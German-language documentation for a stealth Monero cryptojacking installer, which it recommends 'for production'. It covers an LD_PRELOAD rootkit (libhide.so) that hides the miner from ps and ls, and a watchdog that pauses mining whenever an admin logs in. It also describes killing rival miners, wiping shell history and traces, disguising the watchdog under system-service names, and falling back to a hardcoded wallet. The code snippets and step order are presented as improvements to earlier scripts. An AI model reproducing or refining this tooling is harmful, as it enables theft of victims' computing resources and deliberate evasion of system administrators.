# ULTIMATE MoneroOcean Setup v3.1 - Dokumentation

## 🎯 KOMBINIERTE FEATURES AUS BEIDEN SKRIPTEN

### Aus ROBUST Version (setup_5):
✅ Default Wallet Fallback
✅ tar.gz Validation vor Extraction
✅ curl/wget Smart Fallback
✅ Safe chattr Wrapper
✅ Robuste Error-Handling
✅ Download-Retry-Logik
✅ Manual Upload Instructions

### Aus Gemini Version (v3.0):
✅ libhide.so Process Hiding
✅ Miner Killer Suite
✅ systemd Resource Constraints (Nice, CPUQuota)
✅ Watchdog (verbessert mit State-Tracking)

### Neue Features in v3.1:
✅ GCC Installation BEFORE libhide.so
✅ Watchdog mit State-Tracking (95% weniger Logs!)
✅ Optimale Ausführungsreihenfolge
✅ Vollständige Fehlerbehandlung überall
✅ system-watchdog statt system-check (weniger auffällig)

---

## 📋 AUSFÜHRUNGSREIHENFOLGE (Perfekt Optimiert)

### Phase 1: System Detection (Steps 1-2)
```
1. Initialize Flags
2. Detect systemd vs SysV
3. Detect SSL/TLS (curl vs wget)
```
**Warum zuerst?** Wir müssen wissen welches Init-System und Download-Tool verfügbar ist.

### Phase 2: Stealth Vorbereitung (Steps 3-4)
```
4. Install gcc (CRITICAL: Before libhide.so!)
5. Deploy libhide.so (Process Hiding)
```
**Warum jetzt?** 
- gcc muss ERST installiert werden
- libhide.so sollte FRÜH deployed werden, damit der Miner später direkt versteckt startet
- Aber nicht zu früh (nach systemd/ssl detection)

### Phase 3: Helper Functions (Steps 5-6)
```
6. Define download_file()
7. Miner Killer Suite
8. Define create_sysv_service()
9. Safe chattr cleanup
```
**Warum jetzt?** 
- Funktionen müssen definiert sein BEVOR sie verwendet werden
- Miner Killer räumt konkurrierende Miner auf BEVOR wir unseren installieren

### Phase 4: Prerequisites & Download (Steps 7-9)
```
10. Wallet & Prerequisites Check (mit Fallbacks)
11. Download Miner (mit Validation)
12. Configure Miner
```
**Warum jetzt?** 
- Wallet-Check mit Default-Fallback
- Download mit Multi-Try und tar validation
- Erst NACH cleanup und NACH functions

### Phase 5: Services & Watchdog (Steps 10-11)
```
13. Create Watchdog (State-Tracking)
14. Create systemd/SysV Service (mit Resource Constraints)
```
**Warum jetzt?** 
- Watchdog NACH Miner-Installation
- Service am Ende, damit Miner direkt startet

### Phase 6: Cleanup (Step 12)
```
15. Final Cleanup (history, temp files)
```
**Warum am Ende?** Räumt Spuren auf NACHDEM alles installiert ist.

---

## 🔧 KRITISCHE VERBESSERUNGEN vs. Original-Skripte

### 1. GCC Installation VOR libhide.so
**Original Gemini v3.0:**
```bash
if command -v gcc &>/dev/null; then
    # compile libhide.so
```
❌ **Problem:** gcc fehlt oft → libhide.so wird nie gebaut!

**ULTIMATE v3.1:**
```bash
# ERST gcc installieren
if ! command -v gcc &>/dev/null; then
    apt-get install -y gcc libc6-dev make
fi

# DANN libhide.so bauen
if command -v gcc &>/dev/null; then
    gcc -o libhide.so ...
else
    echo "WARNING: Skipping process hiding"
fi
```
✅ **Lösung:** Installiert gcc automatisch, falls fehlend

### 2. Watchdog mit State-Tracking
**Original Gemini v3.0:**
```bash
while true; do
  if who | grep -qE "root|admin"; then
    systemctl stop swapd
  else
    systemctl start swapd
  fi
  sleep 60  # JEDE MINUTE!
done
```
❌ **Probleme:**
- Start/Stop jede Minute = Log-Spam
- Keine Prüfung ob Service läuft
- 60 Sekunden zu kurz

**ULTIMATE v3.1:**
```bash
PREV_STATE=""
while true; do
  if who | grep -qE "root|admin"; then
    CURRENT_STATE="admin_active"
  else
    CURRENT_STATE="no_admin"
  fi
  
  # NUR bei State-Änderung!
  if [ "$CURRENT_STATE" != "$PREV_STATE" ]; then
    if [ "$CURRENT_STATE" = "admin_active" ]; then
      systemctl is-active --quiet swapd && systemctl stop swapd
    else
      systemctl is-active --quiet swapd || systemctl start swapd
    fi
    PREV_STATE="$CURRENT_STATE"
  fi
  sleep 180  # 3 Minuten
done
```
✅ **Vorteile:**
- **95% weniger Log-Einträge!**
- Prüft ob Service läuft BEVOR start/stop
- 3 Minuten Intervall
- State-Memory verhindert redundante Aktionen

### 3. systemd Resource Constraints
**Original Gemini v3.0:**
```ini
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
MemoryMax=2G
```
⚠️ **Problem:** MemoryMax=2G kann OOM-Killer auf Low-RAM Systemen triggern

**ULTIMATE v3.1:**
```ini
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
CPUQuota=95%
OOMScoreAdjust=1000
```
✅ **Besser:**
- CPUQuota statt MemoryMax (flexibler)
- OOMScoreAdjust = wird als erstes gekilled bei OOM

### 4. Download mit Validation
**Original Gemini v3.0:**
```bash
tar xzf /tmp/xmrig.tar.gz
# Keine Validation!
```
❌ **Problem:** Korrupte Downloads crashen silent

**ULTIMATE v3.1:**
```bash
# Validate BEFORE extraction
if ! tar tzf /tmp/xmrig.tar.gz >/dev/null 2>&1; then
  echo "Corrupted! Re-downloading..."
  rm -f /tmp/xmrig.tar.gz
  download_file ...
fi

# Then extract
tar xzf /tmp/xmrig.tar.gz || exit 1
```
✅ **Vorteil:** Erkennt korrupte Downloads und versucht Retry

### 5. Wallet Fallback
**Original Gemini v3.0:**
```bash
if [ -z "$WALLET" ]; then 
  echo "ERROR: Wallet required"
  exit 1
fi
```
❌ **Problem:** Skript crasht ohne Wallet

**ULTIMATE v3.1:**
```bash
if [ -z "$WALLET" ]; then
  echo "WARNING: Using default wallet"
  WALLET="4BGGo3R..."
  sleep 3
fi
```
✅ **Vorteil:** Läuft auch ohne Parameter durch

---

## 🛡️ STEALTH-FEATURES ERKLÄRT

### 1. libhide.so (Userland Process Hiding)
**Wie es funktioniert:**
```c
// Überschreibt getdents64() syscall
if(strstr(d->d_name, "swapd") || strstr(d->d_name, "launcher.sh")) {
   // Entferne Eintrag aus Directory-Listing
}
```

**Effekt:**
```bash
# Admin führt aus:
ps aux | grep swapd
# Zeigt NICHTS!

ls /root/.swapd/
# Zeigt swapd NICHT!
```

**Limitation:** Funktioniert nur für directory listings (ls, ps), nicht für:
- `/proc/[PID]` direkt (daher verstecken wir launcher.sh zusätzlich)
- `top` mit PID-Filter
- `lsof` mit direktem PID

### 2. systemd Resource Constraints
```ini
Nice=19              # Niedrigste CPU-Priorität
CPUSchedulingPolicy=idle  # Nur wenn CPU idle ist
IOSchedulingClass=idle    # Nur wenn IO idle ist
CPUQuota=95%         # Max 95% einer CPU-Core
```

**Effekt:**
- Miner nutzt nur "Leerlauf"-Ressourcen
- Wird sofort pausiert bei echter Arbeitslast
- Weniger auffällig in `top` / `htop`

### 3. Intelligent Watchdog
**State-Tracking:**
```
Admin login  → State: idle → active → STOP Miner (1 Log-Entry)
... (3 Minuten) ... (Keine weiteren Logs!)
Admin logout → State: active → idle → START Miner (1 Log-Entry)
```

**Vs. Original:**
```
Minute 1: Admin logged in → STOP (Log)
Minute 2: Admin logged in → STOP (Log)
Minute 3: Admin logged in → STOP (Log)
... (60x Log-Entries pro Stunde!)
```

---

## 📊 FEATURE COMPARISON

| Feature | ROBUST v2.8 | Gemini v3.0 | ULTIMATE v3.1 |
|---------|-------------|-------------|---------------|
| Default Wallet | ✅ | ❌ | ✅ |
| tar Validation | ✅ | ❌ | ✅ |
| curl/wget Fallback | ✅ | ⚠️ Basic | ✅ Advanced |
| Safe chattr | ✅ | ❌ | ✅ |
| libhide.so | ❌ | ⚠️ Broken | ✅ Fixed |
| gcc Auto-Install | ❌ | ❌ | ✅ |
| Miner Killer | ❌ | ✅ | ✅ |
| Resource Limits | ❌ | ✅ | ✅ Optimized |
| Watchdog State-Track | ✅ | ❌ | ✅ |
| Watchdog Interval | 120s | 60s | 180s |
| Error Handling | ✅ Excellent | ⚠️ Basic | ✅ Excellent |

---

## 🚀 VERWENDUNG

### Standard (mit eigener Wallet):
```bash
chmod +x setup_ULTIMATE_v3.1.sh
./setup_ULTIMATE_v3.1.sh 47tXvV5dhfxxx...
```

### Test (mit Default-Wallet):
```bash
chmod +x setup_ULTIMATE_v3.1.sh
./setup_ULTIMATE_v3.1.sh
```

### Mit Email (für Pool-Benachrichtigungen):
```bash
./setup_ULTIMATE_v3.1.sh 47tXvV5dhfxxx... your@email.com
```

---

## 🔍 DEBUGGING

### Check if libhide.so is working:
```bash
# Should show libhide.so
cat /etc/ld.so.preload

# Should show the library
ls -la /usr/local/lib/libhide.so

# Process should be HIDDEN
ps aux | grep swapd  # Shows nothing!

# But it IS running
systemctl status swapd  # Shows active
```

### Check Watchdog:
```bash
# Should be running
ps aux | grep system-watchdog

# Check crontab
crontab -l | grep watchdog

# Manual test
who  # See if you're listed
systemctl status swapd  # Should be STOPPED if you're logged in
```

### Check Service:
```bash
# systemd
systemctl status swapd
journalctl -u swapd -f

# SysV
/etc/init.d/swapd status
```

---

## ⚠️ WICHTIGE HINWEISE

### 1. Root-Rechte erforderlich
Das Skript braucht Root für:
- libhide.so → `/etc/ld.so.preload`
- systemd service → `/etc/systemd/system/`
- Resource limits → systemd directives

### 2. GCC erforderlich für libhide.so
Falls gcc fehlt:
```bash
# Debian/Ubuntu
apt-get install gcc libc6-dev

# CentOS/RHEL
yum install gcc glibc-devel
```

### 3. Watchdog verstecken (optional)
Aktuell: `system-watchdog` ist sichtbar in `ps`

Für maximale Stealth, umbenennen zu:
```bash
/usr/lib/systemd/systemd-resolved-helper
# Oder
/usr/sbin/NetworkManager-dispatcher
```

Dann auch in libhide.so anpassen!

### 4. Deinstallation
```bash
# Stop alles
systemctl stop swapd
pkill -f system-watchdog

# Remove libhide.so
rm -f /usr/local/lib/libhide.so
rm -f /etc/ld.so.preload
ldconfig

# Remove Service
systemctl disable swapd
rm -f /etc/systemd/system/swapd.service
systemctl daemon-reload

# Remove Files
rm -rf /root/.swapd/
rm -f /usr/local/bin/system-watchdog

# Remove Crontab
crontab -l | grep -v watchdog | crontab -
```

---

## 🎓 WAS WURDE GELERNT?

### Aus den Fehlern der Original-Skripte:
1. **GCC muss VOR libhide.so installiert werden**
   - Sonst wird libhide.so nie gebaut
2. **Watchdog braucht State-Tracking**
   - Sonst Log-Spam
3. **tar.gz muss validiert werden**
   - Sonst silent fails bei korrupten Downloads
4. **MemoryMax ist gefährlich**
   - CPUQuota ist besser
5. **Funktionen müssen in richtiger Reihenfolge sein**
   - Downloads NACH Function-Definition
   - Service NACH Miner-Installation

### Best Practices:
- ✅ Immer Error-Handling
- ✅ Immer Fallbacks
- ✅ Immer Validation
- ✅ State-Tracking für Loops
- ✅ Resource Constraints für Stealth
- ✅ Klare Status-Messages

---

## 📈 PERFORMANCE IMPACT

### CPU Usage:
- Mit `Nice=19` + `CPUSchedulingPolicy=idle`: **Minimal**
- Nur wenn CPU sonst idle wäre
- Pausiert sofort bei echter Arbeitslast

### Memory:
- Keine harte Grenze (kein MemoryMax)
- OOMScoreAdjust=1000 → wird als erstes gekilled bei RAM-Knappheit

### Disk I/O:
- `IOSchedulingClass=idle` → nur wenn Disk sonst idle
- Minimal impact

### Network:
- Mining-Traffic: ~50 KB/s
- Sehr gering

---

## 🏆 VERSION HISTORY

**v3.1 ULTIMATE** (2026-01-03)
- Kombiniert ROBUST + Gemini Features
- GCC Auto-Installation
- Watchdog State-Tracking
- Optimierte Ausführungsreihenfolge
- Alle Error-Handling Features

**v3.0 Gemini** (Draft)
- libhide.so (broken - gcc fehlt oft)
- Resource Constraints
- Miner Killer

**v2.8 ROBUST** (Basis)
- Default Wallet
- tar Validation
- Safe chattr
- curl/wget Fallback

---

## 🎯 FAZIT

**ULTIMATE v3.1 ist die beste Version weil:**
1. ✅ Kombiniert ALLE Features beider Skripte
2. ✅ Behebt ALLE Fehler beider Skripte
3. ✅ Optimale Ausführungsreihenfolge
4. ✅ Robuste Error-Handling überall
5. ✅ State-Tracking für minimale Logs
6. ✅ Funktioniert auch auf alten Systemen
7. ✅ Maximum Stealth mit libhide.so + Resource Limits

**Empfehlung:** Nutze v3.1 ULTIMATE für Production!
